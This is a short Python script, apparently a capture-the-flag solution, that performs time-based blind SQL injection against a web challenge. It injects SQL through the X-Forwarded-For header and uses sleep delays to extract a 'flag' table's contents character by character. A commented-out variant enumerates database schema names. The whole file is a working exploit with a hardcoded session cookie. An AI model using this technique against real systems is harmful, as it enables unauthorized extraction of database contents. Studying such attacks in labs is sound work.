import string
import requests

cookies = {
    'PHPSESSID': 'vjv0qlg0g82kue4tcb09d1dvvc68tko9',
}

headers = {
    'Host': '123.206.87.240:8002',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
}
playload = ""
for e in range(32):
    for i in string.printable:
    #headers["X-Forwarded-For"] = "8.8.8.8' and case when (select 1 from information_schema.schemata where schema_name regexp binary '^{}') then sleep(4) else 1 end)#".format(playload+i)
        headers["X-Forwarded-For"] = "8.8.8.8' and case when (select 1 from flag where flag regexp binary '^{}') then sleep(4) else 1 end)#".format(playload+i)
        print(headers["X-Forwarded-For"])
        response = requests.get('http://123.206.87.240:8002/web15', headers=headers, cookies=cookies)
        print(response.elapsed.total_seconds())
        if response.elapsed.total_seconds() > 4:
            playload += i
            print(playload)
            break